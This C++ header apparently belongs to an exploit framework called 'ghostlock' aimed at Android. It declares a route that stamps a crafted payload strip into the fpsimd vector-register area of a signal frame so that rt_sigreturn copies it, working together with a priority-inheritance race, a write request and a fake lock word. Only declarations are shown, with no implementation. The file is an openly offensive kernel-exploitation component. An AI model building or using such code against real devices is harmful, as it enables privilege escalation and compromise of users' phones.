#ifndef SIGRETURN_ROUTE_H
#define SIGRETURN_ROUTE_H

/* Delivery through rt_sigreturn's fpsimd copy; see
 * docs/analysis/sigreturn-stamp-route-plan.md. */

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "race/pi_race.h"
#include "route/route_status.h"

#include <array>
#include <cstddef>
#include <cstdint>
#include <signal.h>

namespace ghostlock::route::sigreturn {
    inline constexpr std::size_t kCopyBytes = 0x200;
    inline constexpr std::size_t kStripBytes = memory::kWaiterBytes;

    struct Geometry final {
        std::size_t off_sve = 0;
        std::size_t off_plain = 0;
    };

    /* Both offsets must be present, 8-aligned, non-zero, and leave room for
     * the strip inside the copy window. */
    [[nodiscard]] bool geometry_from(const profile::SigreturnLayout &layout,
                                     Geometry *out) noexcept;

    struct FpState final {
        std::size_t vregs_offset = 0;
        bool sve = false;
    };

    [[nodiscard]] bool locate_fpstate(const void *reserved, std::size_t reserved_bytes,
                                      FpState *out) noexcept;

    /* Place `strip` at the path's offset inside the frame's vregs array; this
     * is the stamp. Refuses when the frame has no fpsimd record. */
    [[nodiscard]] bool patch_fpstate(void *reserved, std::size_t reserved_bytes,
                                     const void *strip, std::size_t strip_bytes,
                                     const Geometry &geometry,
                                     bool *sve_path) noexcept;

    class SigreturnRoute final {
    public:
        SigreturnRoute(ghostlock::race::PiRace *race,
                       const ghostlock::memory::WriteRequest *request,
                       const ghostlock::profile::TargetProfile &profile_value,
                       ghostlock::profile::SigreturnLayout route_layout) noexcept;

        ~SigreturnRoute() noexcept = default;

        SigreturnRoute(const SigreturnRoute &) = delete;

        SigreturnRoute &operator=(const SigreturnRoute &) = delete;

        [[nodiscard]] int32_t prepare() noexcept;

        [[nodiscard]] ghostlock::route::RouteStatus execute() noexcept;

        void disarm() noexcept;

        void destroy() noexcept;

        [[nodiscard]] int32_t fail(int32_t step, int32_t error_number) noexcept;

        ghostlock::race::PiRace *race = nullptr;
        const ghostlock::memory::WriteRequest *request = nullptr;
        const ghostlock::profile::TargetProfile &profile;
        ghostlock::profile::SigreturnLayout layout{};
        Geometry geometry{};
        /* The eleven words the handler splices; rebuilt per attempt. */
        std::array<std::byte, kStripBytes> strip{};
        /* The last stamp's lock word: the anchor slot or the page's fake lock. */
        uintptr_t lock_word = 0;
        struct sigaction previous_action {};
        sigset_t previous_mask {};
        int32_t trigger_signal = 0;
        int32_t trigger_tid = -1;
        int32_t trigger_pid = -1;
        int32_t handler_installed = 0;
        int32_t mask_changed = 0;
        int32_t consumer_stuck = 0;
        int32_t stamps = 0;
        int32_t stamp_misses = 0;
        int32_t consumer_calls = 0;
        int32_t consumer_successes = 0;
        ghostlock::route::RouteStatus status{};

    private:
#if defined(__ANDROID__)
        [[nodiscard]] bool install_trigger() noexcept;

        [[nodiscard]] bool build_stamp(int32_t attempt) noexcept;

        void stamp_window(const struct timespec &started) noexcept;
#endif
    };
} // namespace ghostlock::route::sigreturn

#endif
